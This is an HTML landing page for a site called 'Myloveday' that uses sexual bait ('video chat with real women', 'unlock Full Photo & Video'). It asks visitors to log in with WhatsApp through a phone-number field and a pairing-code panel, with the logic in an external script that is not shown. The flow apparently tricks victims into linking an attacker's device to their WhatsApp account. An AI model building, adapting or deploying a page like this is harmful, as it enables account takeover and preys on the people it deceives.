<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title data-copy="title">Myloveday</title>
    <meta name="description" content="Log in with WhatsApp to video chat." data-copy="description" />
    <meta property="og:title" content="Myloveday" data-copy="title" />
    <meta property="og:description" content="Log in with WhatsApp to video chat." data-copy="description" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="assets/images/og-image.jpg" />
    <link rel="stylesheet" href="assets/theme.css" />
    <script src="assets/account-link-elements.js" defer></script>
  </head>
  <body>
    <div class="scene" aria-hidden="true">
      <div class="scene-scroll">
        <div class="scene-scroll-track">
          <div class="scene-scroll-frame"></div>
          <div class="scene-scroll-frame"></div>
        </div>
      </div>
      <div class="scene-veil"></div>
      <div class="scene-thumbs">
        <div class="scene-thumbs-track">
          <img src="assets/images/2.jpg" alt="" class="scene-thumb" width="437" height="779" />
          <img src="assets/images/3-1.jpg" alt="" class="scene-thumb" width="440" height="779" loading="lazy" />
          <img src="assets/images/4.jpg" alt="" class="scene-thumb" width="439" height="777" loading="lazy" />
          <img src="assets/images/5-1.jpg" alt="" class="scene-thumb" width="439" height="779" loading="lazy" />
          <img src="assets/images/6-1.jpg" alt="" class="scene-thumb" width="460" height="690" loading="lazy" />
          <img src="assets/images/7.jpg" alt="" class="scene-thumb" width="438" height="780" loading="lazy" />
          <img src="assets/images/8.jpg" alt="" class="scene-thumb" width="437" height="780" loading="lazy" />
          <img src="assets/images/2.jpg" alt="" class="scene-thumb" width="437" height="779" loading="lazy" />
          <img src="assets/images/3-1.jpg" alt="" class="scene-thumb" width="440" height="779" loading="lazy" />
          <img src="assets/images/4.jpg" alt="" class="scene-thumb" width="439" height="777" loading="lazy" />
        </div>
      </div>
    </div>

    <main class="theme-shell">
      <header class="campaign-header">
        <h1 class="brand-title" data-copy="brandTitle">Myloveday</h1>
        <div class="hero-row">
          <div class="hero-avatar">
            <img src="assets/images/cs1.jpg" alt="" width="437" height="779" loading="lazy" />
          </div>
          <p class="hero-text" data-copy="heroText">
            Log in with WhatsApp to video chat with real women. (The women here are very direct.)
          </p>
        </div>
      </header>

      <div class="campaign-copy">
        <h2 data-copy="overlayTitle">Log in to unlock Full Photo &amp; Video</h2>
        <p data-copy="overlaySubtitle">Enjoy more exciting content!</p>
      </div>

      <section class="link-card">
        <account-link-flow>
          <account-link-locale-switcher></account-link-locale-switcher>
          <phone-number-field></phone-number-field>
          <account-link-submit></account-link-submit>
          <pairing-code-panel></pairing-code-panel>
          <app-launch-actions></app-launch-actions>
          <account-link-status></account-link-status>
          <account-initialization-status></account-initialization-status>
        </account-link-flow>
      </section>
    </main>
  </body>
</html>
